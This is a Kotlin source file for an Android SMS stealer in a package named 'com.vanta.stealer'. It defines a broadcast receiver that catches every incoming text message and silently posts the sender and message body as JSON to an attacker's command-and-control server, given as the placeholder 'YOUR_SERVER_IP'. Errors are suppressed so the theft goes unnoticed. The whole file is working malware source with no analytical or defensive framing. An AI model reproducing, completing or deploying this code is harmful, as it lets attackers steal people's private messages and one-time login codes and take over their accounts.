package com.vanta.stealer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import kotlin.concurrent.thread

class SmsReceiver : BroadcastReceiver() {
    private val C2 = "http://YOUR_SERVER_IP:8080/sms"

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val msgs = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (sms in msgs) {
                val sender = sms.displayOriginatingAddress
                val body = sms.messageBody
                thread {
                    try {
                        val json = JSONObject()
                        json.put("sender", sender)
                        json.put("body", body)

                        val conn = URL(C2).openConnection() as HttpURLConnection
                        conn.requestMethod = "POST"
                        conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                        conn.doOutput = true
                        val os = conn.outputStream
                        os.write(json.toString().toByteArray(Charsets.UTF_8))
                        os.flush()
                        os.close()
                        conn.responseCode
                    } catch (_: Exception) {}
                }
            }
        }
    }
}
